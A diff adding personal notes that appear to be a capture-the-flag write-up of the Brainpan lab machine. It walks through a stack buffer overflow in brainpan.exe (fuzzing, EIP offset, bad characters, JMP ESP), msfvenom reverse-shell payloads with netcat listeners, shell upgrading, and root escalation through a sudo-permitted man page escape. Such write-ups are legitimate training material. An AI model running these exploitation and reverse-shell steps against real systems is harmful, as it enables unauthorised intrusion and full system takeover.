@@ -1,0 +1,89 @@
+Brainpan1
+	- 9999/tcp  open  abyss?
+	- 10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+- *nc 10.201.27.52 9999*
+
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD                              
+
+                          >> password
+                          ACCESS DENIED
+- *python dirsearch.py -u http://10.201.27.52:10000 -e html -x 400,401,403*
+	- finds /bin
+- *wget -r http://10.201.27.52:10000/bin*
+	- includes brainpan.exe
+- *gdb brainpan.exe*
+- we make a python script "fuzzer.py" to find the overflow in the exe running on our system (through gdb)
+![[Pasted image 20250912184157.png]]
+- *python fuzzer.py*
+- we want to "control the pointer" (EIP) - overwrite it to be something malicious
+- code reports that crash occurred at 1000 bytes
+- *msf-pattern_create -l 1000*
+	- edit code to include the payload generated here
+	![[Pasted image 20250912184519.png]]
+- *python fuzzer.py*
+	- note the new value in EIP when prgram fails
+- *msf-patter_offset -l 1000 -q [LastValueOfEIP]*
+	- "exact match at offset 524" <-- that is the exact offset of EIP
+- edit fuzzer.py, one more time:
+![[Pasted image 20250912185004.png]]
+- EIP should appear with "42424242" when program crashes
+- google: badchars
+	- copy from https://github.com/cytopia/badchars
+![[Pasted image 20250912185539.png]]
+- *python fuzzer.py*
+- return to program crashing, right click ESP -> "Follow in Dump" -> looking for any bad character in the application by looking in Hex Dump
+- grab "mona.py" from https://github.com/corelan/mona to work with Immunity Debugger (on Windows)
+- run brainpan.exe again in immunity, type *!mona modules* into bottom text entry
+	- checking for any protections running on the exe
+- type *!mona find -s "\xff\xe4" -m brainpan.exe* <-- \xff\xe4 is the jump ESP code
+	- found at 0x311712f3
+- enter "0x311712f3" as expression to follow in Immunity
+	- set breakpoint at this address
+- edit "fuzzer.py"
+![[Pasted image 20250912190655.png]]
+- *python fuzzer.py*
+	- look to see that we are hitting jump ESP
+- run brainpan.exe as admin
+- *msfvenom -p windows/shell_reverse_tcp LHOST=[192.168.124.128] LPORT=7777 -b "\x00" -f c*
+	- copy this output into fuzzer.py
+![[Pasted image 20250912191149.png]]
+- *nc -nvlp 7777*
+- *python fuzzer.py*
+- Moving on to the live target (now that we have PoC on local)
+- *msfvenom -p windows/shell_reverse_tcp LHOST=[KaliIOnTHMNet] LPORT=7777 -b "\x00" -f c*
+	- copy output to fuzzer.py
+![[Pasted image 20250912191622.png]]
+- *nc -nlvp 9999*
+- *python fuzzer.py*
+- our listener receives a low level shell
+- *dir*
+	- we are in Z: drive
+- we are on Linux file system on Windows
+	- can run some Linux commands in /bin folder
+- its best we go back and generate our payload for a proper linux machine, to get a full shell
+- *msfvenom -p linux/x86/shell_reverse_tcp LHOST=[KaliIOnTHMNet] LPORT=7777 -b "\x00" -f c*
+	- ***copy the output her into "payload2" in our fuzzer.py one more time***
+- *nc -nvlp 9999*
+- *python fuzzer.py*
+- *whoami*
+	- puck
+- ***UPGRADING OUR SHELL***
+	- https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell
+	- copy *python -c 'import pty; pty.spawn("/bin/sh")'*
+	- *python -c 'import pty; pty.spawn("/bin/bash")'*
+	- *stty raw -echo*
+	- *fg* <-- will not appear
+	- *fg*
+	- *export TERM=xterm*
+- *sudo -l*
+	- we can run "/home/anansi/bin/anansi_util" as sudo
+- *sudo /home/anansi/bin/anansi_util*
+	- to see what it does
+	- it shows we have several options, including "manual" [command] which gives the man page of the selected command
+- once in the man page, we can type *!/bin/bash* and ENTER to upgrade to root shell
+	- https://gtfobins.github.io/gtfobins/man/
+		sudo man man
+		!/bin/sh
+- *whoami*
+	- root
